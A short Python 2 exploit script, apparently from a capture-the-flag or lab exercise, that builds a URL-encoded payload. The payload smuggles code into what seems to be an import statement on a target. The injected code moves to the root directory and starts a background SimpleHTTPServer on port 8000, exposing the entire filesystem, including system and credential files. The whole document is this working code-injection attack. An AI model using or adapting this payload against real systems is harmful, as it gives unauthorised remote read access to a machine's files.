#! /usr/bin/env python


from urllib import quote


PORT = 8000


def build(code, module="a"):
    head = "{} import *\n".format(module)
    tail = "\nfrom sys "
    return quote(head + code.strip() + tail)


def main():
    code = """
import os
os.chdir("/")
os.system("python -m SimpleHTTPServer {} &")
""".format(PORT)
    print build(code)


if __name__ == "__main__":
    main()
